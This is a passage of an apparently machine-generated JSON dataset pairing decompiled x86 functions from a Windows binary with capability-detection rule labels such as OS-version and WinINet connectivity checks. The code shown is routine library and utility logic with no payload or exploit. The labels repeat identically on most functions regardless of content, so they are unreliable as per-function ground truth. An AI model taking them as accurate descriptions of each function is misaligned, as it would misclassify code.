        "decompiled_code": "\nvoid __fastcall fcn.0041a570(uint *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e658;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x4478dc;\n    var_4h = 0;\n    if ((param_1[0x15] != 0) && (*param_1[4] == param_1 + 0x12)) {\n        uVar1 = param_1[0x10];\n        *param_1[4] = param_1[0xf];\n        *param_1[8] = uVar1;\n        *param_1[0xc] = 0;\n    }\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.0041a310(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00418650();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 294
    },
    "0041b3f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_558h\n// WARNING: Variable defined which should be unmapped: var_574h\n// WARNING: Variable defined which should be unmapped: var_570h\n// WARNING: Variable defined which should be unmapped: var_568h\n// WARNING: Variable defined which should be unmapped: var_564h\n// WARNING: Variable defined which should be unmapped: var_560h\n// WARNING: Variable defined which should be unmapped: var_55ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041b3f0(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h, uint *arg_1ch, uint *arg_20h, \n            uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint *arg_18h_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_10h_00;\n    uint *arg_14h_00;\n    uint *puVar3;\n    uint *var_574h;\n    uint *var_570h;\n    uint *var_568h;\n    uint *var_564h;\n    uint *var_560h;\n    uint *var_55ch;\n    uint *var_558h;\n    uint var_554h;\n    uint *puStack1364;\n    uint *puStack1360;\n    uint *puStack1356;\n    uint *puStack1352;\n    uint *puStack1348;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_564h = arg_8h;\n    var_55ch = arg_1ch;\n    var_558h = arg_18h;\n    var_568h = arg_ch;\n    var_560h = arg_20h;\n    (**0x462e8c)(&fcn.0041b3f0::var_414h, 0x446e98, arg_ch);\n    arg_14h_00 = &fcn.0041b3f0::var_554h;\n    arg_10h_00 = &fcn.0041b3f0::var_414h;\n    var_574h = (**0x4630f8)();\n    var_570h = NULL;\n    if (var_574h != 0xffffffff) {\n        do {\n            arg_18h_00 = var_558h;\n            puVar3 = var_55ch;\n            puVar1 = var_564h;\n            arg_ch_00 = 0x446d4c;\n            arg_8h_00 = &fcn.0041b3f0::var_528h;\n            iVar2 = (**0x463068)();\n            if ((iVar2 != 0) && (iVar2 = (**0x463068)(&fcn.0041b3f0::var_528h, 0x446d48),  iVar2 != 0)) {\n                (**0x462e8c)(&fcn.0041b3f0::var_108h, 0x446d50, var_568h, &fcn.0041b3f0::var_528h);\n                fcn.0042a6e0(&fcn.0041b3f0::var_20ch, 0, 0x104);\n                (**0x462e8c)(&fcn.0041b3f0::var_20ch, 0x447148, var_568h, &fcn.0041b3f0::var_528h, *0x4521cc, *0x451b44)\n                ;\n                fcn.0042a6e0(&fcn.0041b3f0::var_310h, 0, 0x104);\n                (**0x462e8c)(&fcn.0041b3f0::var_310h, 0x447154, var_568h, *0x4521cc, *0x451b44);\n                iVar2 = (**0x463068)(&fcn.0041b3f0::var_528h, *0x451de4);\n                if (iVar2 == 0) {\n                    puStack1348 = var_560h;\n                    puStack1352 = var_558h;\n                    puStack1356 = arg_14h;\n                    puStack1360 = arg_10h;\n                    puStack1364 = &fcn.0041b3f0::var_108h;\n                    var_558h = 0x41b593;\n                    fcn.0041a840(var_564h, puStack1364, arg_10h, arg_14h, arg_18h_00, var_560h);\n                    if ((arg_24h != NULL) && (var_570h == NULL)) {\n                        var_558h = var_55ch;\n                        var_55ch = 0x41b593;\n                        var_560h = arg_14h;\n                        var_564h = arg_10h;\n                        var_568h = 0x4452bc;\n                        fcn.0041ab60(&fcn.0041b3f0::var_310h, 0x4452bc, arg_10h, arg_14h, 0x41b593, puVar3);\n                    }\ncode_r0x0041b5cf:\n                    var_570h = arg_24h;\n                    var_574h = var_560h;\n                    arg_8h_00 = &fcn.0041b3f0::var_528h;\n                    arg_10h_00 = &fcn.0041b3f0::var_108h;\n                    arg_14h_00 = arg_10h;\n                    unaff_EDI = arg_14h;\n                    unaff_ESI = var_558h;\n                    puVar3 = var_55ch;\ncode_r0x0041b7a8:\n                    fcn.0041b3f0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, unaff_EDI, unaff_ESI, puVar3, var_574h);\n                }\n                else {\n                    puStack1348 = *0x451b44;\n                    puStack1352 = &fcn.0041b3f0::var_528h;\n                    puStack1356 = 0x41b610;\n                    iVar2 = (**0x463068)();\n                    if (iVar2 == 0) {\n                        var_558h = var_55ch;\n                        var_55ch = arg_18h_00;\n                        var_560h = arg_14h;\n                        var_564h = arg_10h;\n                        var_568h = puVar1;\n                        fcn.0041ab60(&fcn.0041b3f0::var_108h, puVar1, arg_10h, arg_14h, arg_18h_00, puVar3);\n                        goto code_r0x0041b5cf;\n                    }\n                    var_558h = &fcn.0041b3f0::var_20ch;\n                    iVar2 = fcn.004209b0(var_558h);\n                    puVar1 = *0x451e88;\n                    var_560h = &fcn.0041b3f0::var_528h;\n                    if (iVar2 != 0) {\n                        var_55ch = 0x41b64d;\n                        var_564h = arg_14h;\n                        var_568h = arg_10h;\n                        var_570h = &fcn.0041b3f0::var_20ch;\n                        fcn.0041ab60(var_570h, var_560h, arg_10h, arg_14h, var_558h, 0x41b64d);\n                        var_574h = arg_24h;\n                        unaff_ESI = 0x41b64d;\n                        arg_ch_00 = &fcn.0041b3f0::var_108h;\n                        arg_8h_00 = &fcn.0041b3f0::var_528h;\n                        arg_10h_00 = arg_10h;\n                        arg_14h_00 = arg_14h;\n                        unaff_EDI = var_558h;\n                        puVar3 = var_558h;\n                        var_560h = var_558h;\n                        goto code_r0x0041b7a8;\n                    }\n                    var_55ch = *0x451e88;\n                    var_564h = 0x41b6b2;\n                    iVar2 = (**0x463068)();\n                    if (iVar2 == 0) {\n                        if (*(in_ECX + 2) != '\\0') {\n                            fcn.00415870(&fcn.0041b3f0::var_108h, 0x41b6b2, arg_10h, arg_14h, var_558h, puVar1);\n                            arg_ch_00 = var_558h;\n                            fcn.00415a60(&fcn.0041b3f0::var_108h, 0x41b6b2, arg_10h, arg_14h, var_558h, puVar1);\n                        }\n                        goto code_r0x0041b5cf;\n                    }\n                    var_570h = *0x451bdc;\n                    var_574h = &fcn.0041b3f0::var_528h;\n                    puVar3 = 0x41b721;\n                    iVar2 = (**0x463068)();\n                    if (iVar2 == 0) {\n                        if (*(in_ECX + 1) != '\\0') {\n                            fcn.0041b080(&fcn.0041b3f0::var_108h, 0x41b6b2, arg_10h, arg_14h, var_558h, puVar1);\n                            fcn.00415650(&fcn.0041b3f0::var_108h, 0x41b6b2, arg_10h, arg_14h, var_558h, puVar1);\n                        }\n                        goto code_r0x0041b7a8;\n                    }\n                    if ((var_554h & 0x10) != 0) goto code_r0x0041b7a8;\n                }\n                fcn.0042a6e0(&fcn.0041b3f0::var_20ch, 0, 0x104);\n                fcn.0042a6e0(&fcn.0041b3f0::var_310h, 0, 0x104);\n            }\n            iVar2 = (**0x462f50)(var_574h, &fcn.0041b3f0::var_554h);\n        } while (iVar2 != 0);\n        (**0x462ec0)(var_574h);\n    }\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 2540
    },
    "0041cb10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041cb10(uint arg_8h, uint32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f192;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_14h != 0) {\n        *in_ECX = 0x447a38;\n        in_ECX[0x1a] = 0x4477c8;\n        var_4h = 0;\n    }\n    *(in_ECX + *(*in_ECX + 4)) = 0x4477c0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    iVar3 = *(*in_ECX + 4);\n    fcn.00418570(uVar2);\n    *(in_ECX + iVar3 + 0x38) = in_ECX + 4;\n    *(in_ECX + iVar3 + 0x3c) = 0;\n    uVar1 = fcn.00419580(0x20);\n    *(in_ECX + iVar3 + 0x40) = uVar1;\n    if (*(in_ECX + iVar3 + 0x38) == 0) {\n        fcn.00418440(*(in_ECX + iVar3 + 0xc) | 4, 0);\n    }\n    var_4h = 2;\n    *(in_ECX + *(*in_ECX + 4)) = 0x447a34;\n    fcn.00418ec0();\n    in_ECX[4] = 0x4478dc;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x59) = 0;\n    in_ECX[8] = in_ECX + 6;\n    in_ECX[0xc] = in_ECX + 10;\n    in_ECX[0xd] = in_ECX + 0xb;\n    in_ECX[9] = in_ECX + 7;\n    in_ECX[0x10] = in_ECX + 0xe;\n    in_ECX[0x11] = in_ECX + 0xf;\n    in_ECX[7] = 0;\n    *in_ECX[0xd] = 0;\n    *in_ECX[0x11] = 0;\n    *in_ECX[8] = 0;\n    *in_ECX[0xc] = 0;\n    *in_ECX[0x10] = 0;\n    in_ECX[0x19] = 0;\n    in_ECX[0x17] = *0x4625e0;\n    in_ECX[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar3 = fcn.004197b0(arg_8h, arg_ch | 1, arg_10h);\n    if (iVar3 == 0) {\n        uVar2 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n        arg_8h_00 = uVar2 | 2;\n        if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n            arg_8h_00 = uVar2 | 6;\n        }\n        fcn.00418440(arg_8h_00, 0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 915
    },
    "0041cc80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041cc80(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x43e8d3;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(*(*(param_1 + -0x68) + 4) + -0x68 + param_1) = 0x447a34;\n    *(param_1 + -0x58) = 0x4478dc;\n    var_4h._0_1_ = 1;\n    var_4h._1_3_ = 0;\n    if ((*(param_1 + -4) != 0) && (**(param_1 + -0x48) == param_1 + -0x10)) {\n        uVar1 = *(param_1 + -0x18);\n        **(param_1 + -0x48) = *(param_1 + -0x1c);\n        **(param_1 + -0x38) = uVar1;\n        **(param_1 + -0x28) = 0;\n    }\n    if (*(param_1 + -8) != '\\0') {\n        fcn.0041a310(uVar2);\n    }\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00418650();\n    *(*(*(param_1 + -0x68) + 4) + -0x10 + param_1 + -0x58) = 0x4477c0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 443
    },
    "0041ec60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041ec60(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_8h = NULL;\n    var_4h = 0;\n    uVar3 = 0;\n    var_8h = 0;\n    iVar4 = 0;\n    iVar1 = (**0x440050)(0xffff, 0, &var_4h);\n    while( true ) {\n        if (iVar1 != 0) {\n            piVar2 = arg_8h;\n            if (var_4h != 0) {\n                do {\n                    piVar2 = piVar2 + iVar4;\n                    if (*piVar2 == 0) {\n                        var_8h = var_8h + 1;\n                    }\n                    iVar4 = piVar2[1];\n                    uVar3 = uVar3 + iVar4;\n                } while (uVar3 < var_4h);\n            }\n            fcn.0042a7fd(arg_8h);\n            return var_8h;\n        }\n        iVar1 = (**0x463000)();\n        if (iVar1 != 0x7a) break;\n        if (arg_8h != NULL) {\n            fcn.0042a7fd(arg_8h);\n        }\n        arg_8h = fcn.0042a769(var_4h);\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        iVar1 = (**0x440050)(0xffff, arg_8h, &var_4h);\n    }\n    if (arg_8h != NULL) {\n        fcn.0042a7fd(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "0041efd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041efd0(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_44h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h = (**0x463094)(0, 0x104);\n    uVar1 = (**0x46301c)();\n    fcn.0042a6e0(&var_44h, 0, 0x40);\n    var_44h = 0x40;\n    iVar2 = (**0x4630f0)(&var_44h);\n    if (iVar2 == 1) {\n        uVar3 = var_3ch >> 0x14 | var_38h << 0xc;\n        var_38h = var_38h >> 0x14;\n    }\n    else {\n        uVar3 = 0;\n        var_38h = 0;\n    }\n    (**0x462e8c)(uVar1, 0x447bec, uVar3, var_38h);\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 299
    },
    "0041f180": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041f180(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (**0x4630b4)(&var_4h);\n    iVar2 = (**0x463058)(uVar1);\n    if ((iVar2 == 0) || (uVar1 = 0x447c3c,  var_4h == 0)) {\n        uVar1 = 0x447c38;\n    }\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "004208a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004208a0(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *arg_8h;\n    while (cVar1 != '\\0') {\n        arg_8h = arg_8h + 1;\n        iVar2 = iVar2 + 1;\n        cVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 107
    },
    "00421390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00421390(int32_t param_1, uint param_2, char param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43edc0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    puVar1 = fcn.0042e4f1();\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    var_4h = 0;\n    puVar5 = 0x4452bc;\n    if (var_ch_2 == '\\0') {\n        puVar5 = puVar1[2];\n    }\n    fcn.0042a56e();\n    iVar2 = fcn.0042ad20(puVar5);\n    iVar2 = iVar2 + 1;\n    puVar3 = fcn.00429c39(iVar2);\n    puVar4 = puVar3;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar5;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(param_1 + 8) = puVar3;\n    fcn.0042a56e();\n    iVar2 = fcn.0042ad20(0x447024);\n    iVar2 = iVar2 + 1;\n    puVar4 = fcn.00429c39(iVar2);\n    puVar3 = 0x447024;\n    puVar5 = puVar4;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar5 = puVar5 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_1 + 0x10) = puVar4;\n    fcn.0042a56e();\n    iVar2 = fcn.0042ad20(0x44702c);\n    iVar2 = iVar2 + 1;\n    puVar4 = fcn.00429c39(iVar2);\n    puVar3 = 0x44702c;\n    puVar5 = puVar4;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar5 = puVar5 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_1 + 0x14) = puVar4;\n    fcn.0042a56e();\n    *(param_1 + 0xc) = **puVar1;\n    fcn.0042a56e();\n    *(param_1 + 0xd) = *puVar1[1];\n    if (var_ch_2 != '\\0') {\n        fcn.0042a56e();\n        *(param_1 + 0xc) = 0x2e;\n        fcn.0042a56e();\n        *(param_1 + 0xd) = 0x2c;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 839
    },
    "00421560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421560(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    \n    if ((*(*(*in_ECX + 4) + 0xc + in_ECX) & 6) == 0) {\n        (**(**(*(*in_ECX + 4) + 0x38 + in_ECX) + 0x28))(&var_18h, arg_8h, arg_ch, arg_10h, 1);\n        if ((var_10h + var_18h == *0x448780) && ((var_10h >> 0x1f) + var_14h + CARRY4(var_10h, var_18h) == *0x448784)) {\n            uVar1 = *(*(*in_ECX + 4) + 0xc + in_ECX);\n            arg_8h_00 = uVar1 | 2;\n            if (*(in_ECX + *(*in_ECX + 4) + 0x38) == 0) {\n                arg_8h_00 = uVar1 | 6;\n            }\n            fcn.00418440(arg_8h_00, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "00421850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00421850(uint noname_0, uint *arg_ch, uint arg_10h, int32_t *arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    \n    if (arg_1ch != 0) {\n        do {\n            if (arg_14h == NULL) {\ncode_r0x0042189f:\n                arg_10h = CONCAT31(arg_10h._1_3_, 1);\n            }\n            else {\n                uVar1 = *arg_18h;\n                if ((*arg_14h[9] == 0) || (piVar2 = arg_14h[0xd],  *piVar2 < 1)) {\n                    uVar4 = (**(*arg_14h + 0xc))(uVar1);\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    puVar3 = *arg_14h[9];\n                    *arg_14h[9] = puVar3 + 1;\n                    *puVar3 = uVar1;\n                    uVar4 = uVar1;\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x0042189f;\n            }\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 379
    },
    "004218c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004218c0(uint noname_0, uint *arg_ch, uint arg_10h, int32_t *arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (arg_1ch != 0) {\n        do {\n            if (arg_14h == NULL) {\ncode_r0x0042190c:\n                arg_10h = CONCAT31(arg_10h._1_3_, 1);\n            }\n            else {\n                if ((*arg_14h[9] == 0) || (piVar1 = arg_14h[0xd],  *piVar1 < 1)) {\n                    uVar3 = (**(*arg_14h + 0xc))(arg_18h);\n                }\n                else {\n                    *piVar1 = *piVar1 + -1;\n                    puVar2 = *arg_14h[9];\n                    *arg_14h[9] = puVar2 + 1;\n                    *puVar2 = arg_18h;\n                    uVar3 = arg_18h;\n                }\n                if (uVar3 == 0xffffffff) goto code_r0x0042190c;\n            }\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 347
    },
    "00421c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421c20(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e508;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00429e0b(0);\n    iVar3 = *0x462e58;\n    var_4h = 0;\n    var_10h = *0x462e58;\n    if (*0x462e60 == 0) {\n        uVar4 = 0;\n        fcn.00429e0b(0);\n        if (*0x462e60 == 0) {\n            *0x462e60 = *0x4631e0 + 1;\n            *0x4631e0 = *0x462e60;\n        }\n        fcn.00429e33(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x462e60;\n    iVar2 = *arg_8h;\n    if (*0x462e60 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x462e60 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00421cb0;\ncode_r0x00421cce:\n        if (arg_8h_00 != 0) goto code_r0x00421d37;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00421cb0:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x00421cce;\n        iVar2 = fcn.00429ed6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x00421cce;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.004219d0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042ac85(\" inflate 1.1.3 Copyright 1995-1998 Mark Adler \");\n            fcn.0042b331(&var_24h, 0x44d468);\n        }\n        arg_8h_00 = var_10h;\n        *0x462e58 = var_10h;\n        fcn.00429e0b(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.00429e33();\n        fcn.00429e5f(arg_8h_00);\n    }\ncode_r0x00421d37:\n    var_4h = 0xffffffff;\n    fcn.00429e33();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 844
    },
    "00421fa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421fa0(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e508;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00429e0b(0);\n    iVar3 = *0x462e5c;\n    var_4h = 0;\n    var_10h = *0x462e5c;\n    if (*0x462e64 == 0) {\n        uVar4 = 0;\n        fcn.00429e0b(0);\n        if (*0x462e64 == 0) {\n            *0x462e64 = *0x4631e0 + 1;\n            *0x4631e0 = *0x462e64;\n        }\n        fcn.00429e33(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x462e64;\n    iVar2 = *arg_8h;\n    if (*0x462e64 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x462e64 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00422030;\ncode_r0x0042204e:\n        if (arg_8h_00 != 0) goto code_r0x004220b7;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00422030:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0042204e;\n        iVar2 = fcn.00429ed6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0042204e;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00421d60(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042ac85(\" inflate 1.1.3 Copyright 1995-1998 Mark Adler \");\n            fcn.0042b331(&var_24h, 0x44d468);\n        }\n        arg_8h_00 = var_10h;\n        *0x462e5c = var_10h;\n        fcn.00429e0b(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.00429e33();\n        fcn.00429e5f(arg_8h_00);\n    }\ncode_r0x004220b7:\n    var_4h = 0xffffffff;\n    fcn.00429e33();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 848
    },
    "004220e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
